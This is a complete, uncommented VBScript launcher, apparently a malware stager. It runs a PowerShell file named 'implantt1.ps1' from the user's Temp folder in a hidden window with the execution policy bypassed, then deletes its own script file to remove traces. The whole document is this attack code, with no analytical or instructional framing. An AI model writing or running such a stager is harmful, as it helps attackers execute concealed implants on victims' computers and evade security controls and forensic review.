Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\" & CreateObject("WScript.Network").UserName & "\AppData\Local\Temp\implantt1.ps1""", 0
Set objFSO = CreateObject("Scripting.FileSystemObject")
objFSO.DeleteFile WScript.ScriptFullName
